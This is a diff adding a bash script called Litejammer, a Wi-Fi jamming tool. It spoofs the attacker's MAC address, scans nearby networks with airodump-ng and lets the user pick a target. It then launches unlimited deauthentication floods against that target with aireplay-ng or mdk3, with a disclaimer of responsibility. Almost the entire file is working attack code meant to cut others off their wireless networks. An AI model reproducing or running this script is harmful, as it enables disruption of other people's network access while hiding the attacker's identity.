@@ -1,0 +1,126 @@
+#!/usr/bin/env bash
+# encodiing utf-8
+
+
+
+#::Cheking Dependences
+[ $(which aireplay-ng) ] && sleep 0.1 || echo "Please install aircrack-ng"
+[ $(which mdk3) ] && sleep 0.1 || echo "Please install mdk3"
+[ $(which macchanger) ] && sleep 0.1 || echo "Please install macchanger" 
+[ $(which xterm) ] && sleep 0.1 || echo "Please install xterm" 
+[ $UID -eq "0" ] && sleep 0.1 || echo "Please run this tool with root permissions" 
+#################################################
+
+
+
+#::Defining Global Variables
+v_date="$(date +%c)"
+v_pwd="$(pwd)"
+#################################################
+
+
+
+#::Global Functions
+f_logo() {
+	printf "
+Litejammer v1.0 (https://gitlab.com/raioramalho/litejammer)
+
+Blocks wireless connections with deauthentication attacks.
+This tool has been translated from Portuguese[br] into English[us].
+I do not take responsibility for your actions.\n\n"
+}
+
+
+
+f_help() {
+	printf "
+Usage: litejammer -i <interface> -m <attackmode> <extra options>
+Usage: litejammer --simple
+Usage: litejammer --help
+
+Engine Options:
+        -i <>: Specify a wireless interface.
+        -m <>: Specify the attack mode.
+                0 <>: Aireplay-ng deauthentication attack.
+                1 <>: Mdk3 deauthentication attack.
+Extra Options:
+        --simple <>: Run the tool at Easy and simple use mode.
+        --rmac <>: Change the mac for the attack.
+Global Options:
+        --help <>: Show this page.
+        -h <>: Show this page too.\n\n"
+}
+
+
+
+f_iface() {
+	iwconfig $v_iface 
+	if [ -z $v_setmac ] ; then
+		printf "$(macchanger -s $v_iface | sed q)\n\n"
+	else
+		ifconfig $v_iface down >> /dev/null
+		printf "$(macchanger -r $v_iface)\n"
+		ifconfig $v_iface up >> /dev/null
+	fi
+
+	if [ -z $v_mode ] ; then
+                echo "Please slecet the attackmode."
+                exit 1
+        fi
+}
+
+
+
+f_mac() {
+	ifconfig $v_iface down
+	macchanger -r $v_iface >> /dev/null
+	ifconfig $v_iface up
+}
+
+
+
+f_scan() {
+	rm .target* -rf >> /dev/null
+	printf "\nScan:\n"
+	printf "$(xterm -e airodump-ng $v_iface -w $v_pwd/.target)\nBSSID\t\t\tCHAN\tAUTH\t ESSID"
+	printf "\n$(cat .target-01.csv | awk -F ","  '{print $1"\t"$4  "\t" $8 "\t" $14}' | sed 's/ESSID//' | sed 's/Authentication/\tCHAN\tAUTH\t ESSID/' | sed 's/channel//' | sed 's/Power/\tPower/' | sed -n '3,15p')\nSelect a wireless essid for attack: "
+	read v_target
+	v_essid="$v_target"
+	v_bssid=$(cat .target-01.csv | grep "${v_target}" | awk '{print $1}' | sed 's/,//g' )
+	v_channel=$(cat .target-01.csv | grep "${v_target}" | awk '{print $6}' | sed 's/,//g') 
+	printf "Bssid: ${v_bssid} \tChannel: ${v_channel} \tEssid: ${v_essid}\n\n"
+}
+
+
+
+f_air() {
+	iwconfig $v_iface channel $v_channel >> /dev/null
+	xterm -e aireplay-ng -0 0 -a $v_bssid $v_iface
+}
+
+
+f_mdk() {
+	iwconfig $v_iface channel $v_channel >> /dev/null
+	xterm -e mdk3 $v_iface d -a $v_essid
+}
+
+
+f_mode() {
+	case $v_op in
+		0) f_air;;
+		1) f_mdk;;
+	esac	
+}
+#################################################
+
+
+
+#::Arguments Menu
+case $1 in
+	-i)v_iface=$2; v_mode=$3; v_op=$4; v_setmac=$5;f_logo; f_iface; f_scan; f_mode;;
+	--simple);;
+	--help)f_logo; f_help;;
+	-h)f_logo; f_help;;
+	*)f_logo; f_help;;
+esac
+#################################################
